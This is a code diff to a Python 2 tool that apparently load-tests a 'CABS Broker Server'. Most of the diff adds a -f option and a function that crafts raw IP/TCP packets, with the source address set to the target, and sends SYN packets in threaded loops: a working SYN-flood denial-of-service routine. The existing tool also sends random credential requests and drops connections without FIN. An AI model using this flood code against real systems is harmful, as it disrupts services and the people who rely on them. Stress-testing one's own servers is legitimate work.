@@ -23,6 +23,97 @@ def splash():
                                                         
 """
 
+def checksum(msg):
+    #genetate checksum for raw packet
+    cksum = 0
+    for i in range(0, len(msg), 2):
+        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
+        cksum = cksum + w
+    cksum = (cksum >> 16) + (cksum & 0xffff)
+    cksum = ~cksum & 0xffff
+    
+    return cksum
+
+def floodServer():
+    #flood portion adopted from a script by Silver Moon (m00n.silv3r@gmail.com)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    except:
+        print "Socket could not be created, make sure you have root permission"
+        sys.exit()
+    #Don't put in automatic headers
+    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    
+    #Constuct packet
+    packet = ''
+    host = socket.gethostbyname(settings.get("Host"))
+    source = host
+    
+    #ip headers
+    ihl = 5
+    version = 4
+    tos = 0
+    tot_len = 20 + 20 #python correctly fills in the total length?
+    packetid = 57543
+    frag_off = 0
+    ttl = 225
+    protocol = socket.IPPROTO_TCP
+    check = 10 #python correcly fills in the checksum?
+    saddr = socket.inet_aton(source)
+    daddr = socket.inet_aton(host)
+    ihl_version = (version << 4) + ihl
+    ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, packetid, frag_off, ttl, protocol, check, saddr, daddr)
+    
+    #tcp header fields
+    source_p = 1234
+    host_p = int(settings.get("Port"))
+    seq = 0
+    ack_seq = 0
+    doff = 5
+    #flags
+    fin = 0
+    syn = 1
+    rst = 0
+    psh = 0
+    ack = 0
+    urg = 0
+    window = socket.htons(5840) #max window
+    check = 0
+    urg_ptr = 0
+    offset_res = (doff << 4) + 0
+    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
+    tcp_header = struct.pack('!HHLLBBHHH', source_p, host_p, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
+    
+    #pseudo headers
+    source_address = socket.inet_aton(source)
+    dest_address = socket.inet_aton(host)
+    placeholder = 0
+    protocol = socket.IPPROTO_TCP
+    tcp_length = len(tcp_header)
+    psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
+    psh = psh + tcp_header
+    
+    tcp_checksum = checksum(psh)
+    
+    #make tcp_header with correct checksum
+    tcp_header = struct.pack('!HHLLBBHHH', source_p, host_p, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
+    #make the final packet
+    packet = ip_header + tcp_header
+    if settings.get("Number") == 'loop':
+        print("Running... Press Ctrl-C to end")
+        while True:
+            s.sendto(packet, (host, 0))
+    else:
+        for i in range(int(settings.get("Number"))):
+            try:
+                s.sendto(packet, (host, 0))
+                if settings.get("Verbose") == 'True':
+                    print "Sent: SYN packet"
+            except:
+                if settings.get("Verbose") == 'True':
+                    print "Unable to send SYN packet."
+        
+
 def hitServer():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -48,16 +139,20 @@ def hitServer():
             s_wrapped = ssl.wrap_socket(s, ca_certs=settings.get("SSL_Cert"), ssl_version=ssl.PROTOCOL_SSLv23)
         s_wrapped.sendall(content)
         s_wrapped.close()
+        if settings.get("Verbose") == 'True':
+            print "Sent: {0}".format(content)
 
 def printUsage(extend=False):
-    print "Usage : "+sys.argv[0]+" -h host [-p port] [-v] [-s /path/to/cert.pem] [-r] [-e] [-n (#tries | loop)] [-t #threads] [(-m msg) | (-l msg_length)]"
+    print "Usage : "+sys.argv[0]+" -h host [-p port] [-f] [-v] [-s /path/to/cert.pem] [-r] [-e] [-n (#tries | loop)] [-t #threads] [(-m msg) | (-l msg_length)]"
     if extend:
         print "  -h host           : the CABS Broker Server"
         print "  -p port           : the CABS Broker Port for Clients or Agents"
+        print "  -f                : SYN flood, only available on linux as root"
+        print "  -v                : Verbose, warning this outputs a lot!"
         print "  -s /to/cert.pem   : the path to the CABS Broker certificate.pem"
         print "  -r                : don't add a valid return at the end of the message"
         print "  -e                : disconnect evily, with no FIN packet"
-        print "  -n (#tries | loop): the number of requests to send, or loop until Ctrl-C"
+        print "  -n (#tries | loop): the number of requests to send, or loop until key press"
         print "  -t #threads       : the number of threads for making requests"
         print "  -m msg            : the message to send, otherwise a random user name and password will be sent in a pool request"
         print "  -l msg_length     : the length of the random username and password"
@@ -80,6 +175,8 @@ def getArgs():
                 printUsage(True)
             if sys.argv[i] in ['-h', '--host', '-host']:
                 option = "Host"
+            elif sys.argv[i] in ['-f', '--flood', '-flood', '--syn-flood']:
+                settings["Syn_Flood"] = 'True'
             elif sys.argv[i] in ['-v', '--verbose', '-verbose']:
                 settings["Verbose"] = 'True'
             elif sys.argv[i] in ['-p', '--port', '-port']:
@@ -126,7 +223,11 @@ def gucci_main():
     if int(settings.get("Threads")) > 1:
         threads = []
         for i in range(int(settings.get("Threads"))):
-            t=threading.Thread(target=runHit)
+            if settings.get("Syn_Flood") == 'True':
+                t=threading.Thread(target=floodServer)
+            else:
+                t=threading.Thread(target=runHit)
+            
             if settings.get("Number") == 'loop':
                 t.daemon = True
             threads.append(t)
@@ -134,7 +235,10 @@ def gucci_main():
         if settings.get("Number") == 'loop':
             input("Running... Press Enter to end")
     else:
-        runHit()
+        if settings.get("Syn_Flood") == 'True':
+            floodServer()
+        else:
+            runHit()
     
 
 if __name__ == "__main__":
